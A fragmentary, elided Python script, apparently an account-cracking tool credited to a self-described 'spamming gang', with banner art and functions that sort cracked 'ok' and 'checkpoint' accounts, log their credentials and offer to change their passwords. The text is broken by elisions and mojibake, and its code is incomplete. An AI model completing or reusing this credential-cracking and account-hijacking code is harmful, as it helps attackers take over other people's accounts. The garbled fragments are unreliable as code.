...
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS  BY (DEVIL) ")
time.sleep(5)
...
\033[1;31;1mâ–ˆ \033[1;92m [â€¢] \033[1;31;1mAuthor    :  \033[1;92m            \033[1;31;1m â–ˆ
...
\033[1;31;1mâ–ˆ \033[1;92m [â€¢] \033[1;31;1mCyber  :   \033[1;92m Darck Army Spamming Gang BD \033[1;31;1m â–ˆ
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}â€¢{N}] Password example : {H}DEVIL123{N}")
            ...
            for memek in cp:
                ...
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[DEVIL-CP😿] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[DEVIL-CP😿] ", ""), titid[1])
...
class __chigoue__:
    ...
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[DEVIL]","\x1b[1;92m[DEVIL]","\x1b[1;92m[DEVIL]","\x1b[1;92m[DEVIL]","\x1b[1;92m[DEVIL]","\x1b[1;92m[DEVIL]","\x1b[1;92m[DEVIL]"])
